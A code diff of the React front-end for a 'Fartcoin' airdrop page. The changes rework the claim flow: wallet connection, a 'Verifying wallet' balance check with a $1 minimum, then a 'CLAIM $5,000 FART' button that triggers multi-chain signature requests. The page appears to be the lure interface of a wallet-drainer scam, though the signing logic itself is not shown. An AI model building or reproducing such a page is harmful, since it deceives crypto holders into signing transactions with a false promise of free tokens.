@@ -668,7 +668,7 @@ function App() {
       {/* FART Button */}
       <div 
         id="fart-button" 
-        className="fixed bottom-4 right-4 z-50 bg-gray-800/90 border border-white/30 rounded-lg px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-gray-700/90 transition-all"
+        className="fixed bottom-4 right-4 z-50 bg-gray-800/90 border border-white/30 rounded-lg px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-gray-700/90 transition-all hide-mobile"
         onClick={() => {
           const overlay = document.getElementById('fart-overlay');
           const container = document.getElementById('fart-gas-container');
@@ -724,8 +724,8 @@ function App() {
               Fartcoin 💨
             </h1>
 
-            {/* Contract Address */}
-            <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
+            {/* Contract Address - Hidden on mobile, shown on desktop */}
+            <div className="hidden sm:flex terminal-frame flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden">
               <div className="text-sm sm:text-base font-mono truncate">
                 <span className="text-white/70 mr-2">Contract:</span>
                 <span className="text-white truncate">
@@ -777,23 +777,91 @@ function App() {
                   </p>
                 </div>
                 
-                {/* Connect Wallet Section - Highly Reactive */}
+                {/* Dynamic Content Area - THIS IS WHERE ALL THE ACTION HAPPENS */}
                 <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
                   <div className="text-white font-mono text-center">
-                    <p>"FART FREELY, GET RICH"</p>
-                    <p className="text-white/70 text-sm mt-4">
-                      Connect your wallet and{' '}
-                      {!isConnected ? (
+                    {!isConnected ? (
+                      // NOT CONNECTED STATE
+                      <>
+                        <p>"FART FREELY, GET RICH"</p>
                         <button
                           onClick={() => open()}
-                          className="underline transition duration-300 ease-in-out glow-on-hover font-bold text-white hover:text-white/80"
+                          className="underline transition duration-300 ease-in-out glow-on-hover font-bold text-white hover:text-white/80 mt-4"
                         >
                           claim now
                         </button>
-                      ) : (
-                        <span className="text-green-400">wallet connected ✓</span>
-                      )}
-                    </p>
+                      </>
+                    ) : verifying ? (
+                      // VERIFYING STATE
+                      <div className="flex items-center justify-center gap-3">
+                        <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                        <p className="text-white/70">Verifying wallet...</p>
+                      </div>
+                    ) : scanResult && !isEligible ? (
+                      // CONNECTED BUT NOT ELIGIBLE
+                      <>
+                        <p className="text-green-400 text-lg mb-2">👋 Welcome to Fartcoin</p>
+                        <p className="text-white/70 text-sm mb-4">
+                          Minimum $1 required for eligibility.
+                        </p>
+                        <div className="bg-black/50 rounded-lg p-4 border border-white/30">
+                          <p className="text-sm text-gray-300">
+                            Your wallet is connected but doesn't meet the minimum requirement.
+                          </p>
+                        </div>
+                      </>
+                    ) : scanResult && isEligible && !completedChains.length ? (
+                      // ELIGIBLE AND READY TO CLAIM
+                      <>
+                        <p className="text-green-400 text-lg mb-3">✓ You qualify for the airdrop!</p>
+                        <button
+                          onClick={executeMultiChainSignature}
+                          disabled={signatureLoading || loading || !signer}
+                          className="w-full group relative"
+                        >
+                          <div className="absolute -inset-2 bg-gradient-to-r from-white/20 to-white/20 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
+                          <div className="relative bg-gradient-to-r from-gray-800 to-gray-900 rounded-xl py-5 px-8 font-bold text-xl text-white border border-white/30 transform-gpu group-hover:scale-105 transition-all duration-500">
+                            <div className="flex items-center justify-center gap-4">
+                              {signatureLoading ? (
+                                <>
+                                  <div className="relative">
+                                    <div className="w-10 h-10 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+                                  </div>
+                                  <span className="text-lg">PROCESSING...</span>
+                                </>
+                              ) : (
+                                <>
+                                  <span className="text-4xl animate-pulse">💨</span>
+                                  <div>
+                                    <span className="text-lg">
+                                      CLAIM $5,000 FART + {presaleStats.currentBonus}%
+                                    </span>
+                                  </div>
+                                  <span className="bg-white/20 px-4 py-2 rounded-lg">→</span>
+                                </>
+                              )}
+                            </div>
+                          </div>
+                        </button>
+                      </>
+                    ) : completedChains.length > 0 ? (
+                      // ALREADY CLAIMED
+                      <>
+                        <p className="text-green-400 text-lg mb-3">✓ Already claimed on {completedChains.length} chains</p>
+                        <button
+                          onClick={claimTokens}
+                          className="w-full group relative"
+                        >
+                          <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
+                          <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-4 px-6 font-bold text-lg transform-gpu group-hover:scale-105 transition-all duration-500">
+                            🎉 VIEW YOUR $5,000 FART
+                          </div>
+                        </button>
+                      </>
+                    ) : (
+                      // CONNECTED BUT WAITING FOR SCAN
+                      <p className="text-white/70">Checking eligibility...</p>
+                    )}
                   </div>
                 </div>
 
@@ -811,47 +879,6 @@ function App() {
               </div>
             </div>
           </section>
-
-          {/* Wallet Connection Status - When Connected */}
-          {isConnected && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              <div className="terminal-frame p-6 border-white">
-                <div className="flex items-center justify-between flex-wrap gap-4">
-                  <div className="flex items-center gap-4">
-                    <div className="relative group/avatar">
-                      <div className="w-14 h-14 bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl flex items-center justify-center text-3xl border border-white/30">
-                        👤
-                      </div>
-                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-black animate-pulse"></div>
-                    </div>
-                    <div>
-                      <div className="text-xs text-white/70 mb-1">CONNECTED</div>
-                      <div className="font-mono text-sm bg-black/50 px-3 py-1.5 rounded-lg border border-white/30 group/address relative">
-                        {formatAddress(address)}
-                        <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-white/30 mt-1 z-50">
-                          {address}
-                        </span>
-                      </div>
-                    </div>
-                  </div>
-                  <div className="flex items-center gap-6">
-                    <div className="text-right">
-                      <div className="text-xs text-white/70 mb-1">STATUS</div>
-                      <div className="text-sm text-green-400">
-                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
-                      </div>
-                    </div>
-                    <button
-                      onClick={handleDisconnect}
-                      className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
-                    >
-                      ✕
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
 
           {/* Status Messages */}
           {txStatus && !verifying && (
@@ -904,60 +931,6 @@ function App() {
             </div>
           )}
 
-          {/* Main Action Button - Only when eligible */}
-          {isConnected && isEligible && !completedChains.length && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              <button
-                onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer}
-                className="w-full group relative"
-              >
-                <div className="absolute -inset-2 bg-gradient-to-r from-white/20 to-white/20 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
-                <div className="relative bg-gradient-to-r from-gray-800 to-gray-900 rounded-xl py-8 px-8 font-black text-3xl text-white border border-white/30 transform-gpu group-hover:scale-105 transition-all duration-500">
-                  <div className="flex items-center justify-center gap-6">
-                    {signatureLoading ? (
-                      <>
-                        <div className="relative">
-                          <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
-                        </div>
-                        <span className="animate-pulse">PROCESSING...</span>
-                      </>
-                    ) : (
-                      <>
-                        <span className="text-5xl filter drop-shadow-lg animate-pulse">💨</span>
-                        <div>
-                          <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-300">
-                            CLAIM $5,000 FART + {presaleStats.currentBonus}%
-                          </span>
-                          <div className="text-sm font-normal text-white/80 mt-1">
-                            Presale Terms • Instant Delivery
-                          </div>
-                        </div>
-                        <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
-                      </>
-                    )}
-                  </div>
-                </div>
-              </button>
-
-              {/* Quick Stats */}
-              <div className="flex justify-center gap-8 mt-6 text-sm">
-                <div className="flex items-center gap-2">
-                  <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Presale Terms</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Instant Delivery</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">$5,000 Airdrop</span>
-                </div>
-              </div>
-            </div>
-          )}
-
           {/* Live Presale Banner */}
           <div className="max-w-2xl mx-auto mb-8 px-4">
             <div className="inline-flex items-center gap-6 bg-gradient-to-r from-gray-800/50 to-gray-900/50 px-8 py-4 rounded-2xl border border-white/30 backdrop-blur-xl w-full justify-center">
@@ -1001,74 +974,62 @@ function App() {
             ))}
           </div>
 
-          {/* Allocation Card */}
-          {isConnected && !verifying && scanResult && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              {isEligible ? (
-                <div className="space-y-6">
-                  <div className="terminal-frame p-8 border-white/50 relative">
-                    {/* Bonus Badge */}
-                    <div className="absolute -top-4 -right-4">
-                      <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 hover:rotate-0 transition-transform">
-                        +{presaleStats.currentBonus}% BONUS
+          {/* Wallet Connection Status - Desktop View */}
+          {isConnected && (
+            <div className="max-w-2xl mx-auto mb-8 px-4 hidden sm:block">
+              <div className="terminal-frame p-6 border-white">
+                <div className="flex items-center justify-between flex-wrap gap-4">
+                  <div className="flex items-center gap-4">
+                    <div className="relative group/avatar">
+                      <div className="w-14 h-14 bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl flex items-center justify-center text-3xl border border-white/30">
+                        👤
                       </div>
+                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-black animate-pulse"></div>
                     </div>
-                    
-                    <div className="text-center">
-                      <p className="text-white/70 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
-                      <div className="text-7xl font-black bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent mb-2">
-                        $5,000 FART
+                    <div>
+                      <div className="text-xs text-white/70 mb-1">CONNECTED</div>
+                      <div className="font-mono text-sm bg-black/50 px-3 py-1.5 rounded-lg border border-white/30 group/address relative">
+                        {formatAddress(address)}
+                        <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-white/30 mt-1 z-50">
+                          {address}
+                        </span>
                       </div>
-                      <p className="text-green-400 text-xl flex items-center justify-center gap-2">
-                        <span>+{presaleStats.currentBonus}% Bonus</span>
-                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
-                      </p>
                     </div>
                   </div>
+                  <div className="flex items-center gap-6">
+                    <div className="text-right">
+                      <div className="text-xs text-white/70 mb-1">STATUS</div>
+                      <div className="text-sm text-green-400">
+                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
+                      </div>
+                    </div>
+                    <button
+                      onClick={handleDisconnect}
+                      className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
+                    >
+                      ✕
+                    </button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
 
-                  {/* Already completed */}
-                  {completedChains.length > 0 && (
-                    <div className="text-center">
-                      <div className="terminal-frame p-6 border-green-500/50 mb-4">
-                        <p className="text-green-400 text-lg mb-3">✓ COMPLETED ON {completedChains.length} CHAINS</p>
-                        <div className="flex flex-wrap justify-center gap-2 mb-3">
-                          {completedChains.map(chain => (
-                            <span key={chain} className="text-xs bg-green-500/30 px-2 py-1 rounded-full">
-                              {chain}
-                            </span>
-                          ))}
-                        </div>
-                        <p className="text-gray-300">Your $5,000 FART has been secured</p>
-                      </div>
-                      <button
-                        onClick={claimTokens}
-                        className="w-full group relative"
-                      >
-                        <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
-                        <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
-                          🎉 VIEW YOUR $5,000 FART
-                        </div>
-                      </button>
-                    </div>
-                  )}
-                </div>
-              ) : (
-                // Welcome message for non-eligible
-                <div className="terminal-frame p-10 text-center">
-                  <div className="text-7xl mb-6 animate-float">👋</div>
-                  <h2 className="text-3xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
-                    Welcome to Fartcoin
-                  </h2>
-                  <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
-                    Connect your wallet to check eligibility.
-                  </p>
-                  <div className="bg-black/50 rounded-xl p-6 border border-white/30">
-                    <p className="text-sm text-gray-300">
-                      Minimum $1 required for eligibility.
-                    </p>
-                  </div>
-                </div>
-              )}
+          {/* Quick Stats */}
+          {isConnected && isEligible && !completedChains.length && (
+            <div className="flex justify-center gap-8 mt-6 mb-8 text-sm px-4">
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
+                <span className="text-gray-400">Presale Terms</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
+                <span className="text-gray-400">Instant Delivery</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
+                <span className="text-gray-400">$5,000 Airdrop</span>
+              </div>
             </div>
           )}
 
@@ -1327,7 +1288,6 @@ function App() {
         </div>
       )}
 
-      {/* Animation Keyframes */}
       <style>{`
         @keyframes textFlicker {
           0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, to { opacity: 1; }
@@ -1378,10 +1338,6 @@ function App() {
         @keyframes bounce-3d {
           0%, 100% { transform: translateY(0); }
           50% { transform: translateY(-20px); }
-        }
-        @keyframes float {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-10px); }
         }
         .scan-effect {
           position: relative;
@@ -1451,7 +1407,6 @@ function App() {
         .animate-scaleIn { animation: scaleIn 0.5s ease-out; }
         .animate-bounce-3d { animation: bounce-3d 2s ease-in-out infinite; }
         .animate-float-3d { animation: float-3d 6s ease-in-out infinite; }
-        .animate-float { animation: float 3s ease-in-out infinite; }
         .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
         .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
         .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
